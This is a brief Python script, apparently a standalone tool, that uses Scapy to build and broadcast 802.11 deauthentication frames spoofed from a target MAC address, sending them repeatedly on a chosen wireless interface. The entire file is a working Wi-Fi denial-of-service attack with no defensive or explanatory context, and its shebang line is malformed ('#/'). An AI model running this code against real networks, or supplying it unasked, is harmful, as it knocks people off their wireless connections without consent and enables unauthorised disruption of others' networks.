#/ /usr/bin/env python3
from scapy.all import *
from scapy import *


def WifiDeath(cls , MACtarget , count , Interface):
    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=MACtarget,addr3=MACtarget)
    pyload = RadioTap()/packet/Dot11Deauth(reason=7)
    sendp(pyload , inter=1.0,count=count,iface=Interface,verbose=1)
    return pyload
